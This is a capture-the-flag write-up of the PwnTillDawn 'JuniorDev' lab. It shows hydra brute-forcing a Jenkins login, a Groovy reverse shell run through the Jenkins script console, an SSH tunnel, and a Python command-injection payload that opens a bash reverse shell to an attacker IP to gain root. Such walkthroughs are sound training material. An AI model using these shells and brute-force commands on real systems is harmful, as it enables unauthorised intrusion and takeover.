---
title: "PwnTillDawn - JuniorDev"
author: Nasrallah
description: ""
date: 2022-09-21 00:00:00 +0000
categories : [PwnTillDawn]
tags: [pwntilldawn, linux, jenkins, hydra, bruteforce, commandinjection, python, tunneling]
img_path: /assets/img/pwntilldawn/juniordev
---

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [JuniorDev](https://online.pwntilldawn.com/Target/Show/63) from [PwnTillDawn](https://online.pwntilldawn.com/). The target is running a web server on a non standard port. We found a login page that we brute force to get in and then run a command for a reverse shell. Then we find another web server running internally so we use an ssh tunnel to access it. We exploit a command injection vulnerability to get root. 

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.150.150.38
Host is up (0.098s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)
|   256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)
|_  256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found port 22 open running openssh.

We don't have any credentials and the version of ssh doesn't have any vulnerabilities.

Let's scan all ports this time with `sudo nmap --min-rate 5000 -p- 10.150.150.38`

```terminal
Nmap scan report for 10.150.150.38
Host is up (0.094s latency).
Not shown: 64506 closed tcp ports (reset), 1027 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
30609/tcp open  unknown
```

We found another service on a high port, let's run a service scan on that port.

```terminal
Nmap scan report for 10.150.150.38
Host is up (0.22s latency).

PORT      STATE SERVICE VERSION
30609/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.27.v20200227)
```

The port is running a jetty web server.

### Web

Let's navigate to the web page on `http://10.150.150.38:30609/`

![](1.png)

We found a login page for Jenkins.

I tried some default credentials but no luck with that. Let's brute force the login with hydra, but first we need to intercept a login request to see what parameters we need to set.

![](2.png)

Now let's craft our command.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError"
```

Let's run the command.

![](3.png)

Got the password.

## **Foothold**

Let's login to Jenkins.

![](4.png)

Great! Now we need to get a shell. We can do that by going to `Manage Jenkins` -> `Script Console` and enter the following command.

```groovy
String host="10.10.10.10";
int port=9001;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![](5.png)

Now setup a listener with `nc -lvnp 9001` and run the command.

![](6.png)

We got the shell.

## **Privilege Escalation**

Let's do some basic enumeration.

![](7.png)

We found a ssh key. Let's connect with it.

![](8.png)

I uploaded a copy of linpeas and after running it i got this.

![](9.png)

We found a service listening on port 8080 and we can't access it.

We are gonna use ssh tunneling in order to access it.

Run the following command from the attacker machine.

```bash
ssh -L 8000:127.0.0.1:8080 juniordev@10.150.150.38 -i id_rsa -fN
```

Now navigate to `127.0.0.1:8000`.

![](10.png)

We find an application that takes two numbers from us and adds them together.

We see in the title of the page `Jr.dev py example`. Which means this is a python application hens the `py` in the title.

Searching for python command injection, i found this [article](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1) which had the following command that would give us a reverse shell.

```python
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.66.66.10/9999 0>&1"')#
```

Now setup a listener and put the payload above in one of the input fields and click calculate.

![](11.png)

Great! We got a shell as root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
